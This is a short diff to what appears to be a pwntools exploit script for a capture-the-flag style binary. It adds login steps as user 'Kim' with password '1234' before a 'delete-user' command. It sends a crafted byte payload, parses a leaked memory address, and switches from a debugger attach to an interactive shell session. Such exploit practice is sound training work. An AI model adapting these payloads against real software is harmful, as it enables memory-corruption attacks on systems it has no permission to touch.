@@ -7,6 +7,12 @@ p = process(target)
 payload = b"a"*16 + b"user"+b"\x0a"*12 +b'\x0a'*16 + b"user"+b"\x0a"*12 + b'\x01'*8 + b'\x21'+b'\x0a'*7
 
 p.recvuntil(">>>")
+p.sendline("login")
+p.recvuntil(':')
+p.sendline("Kim")
+p.recvuntil(':')
+p.sendline("1234")
+p.recvuntil(">>>")
 p.sendline("delete-user")
 p.recvuntil(':')
 p.sendline("Kim")
@@ -17,5 +23,5 @@ p.sendline(payload)
 msg_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
 print(del_addr, msg_addr)
 
-gdb.attach(p)
-#p.interactive()
+#gdb.attach(p)
+p.interactive()
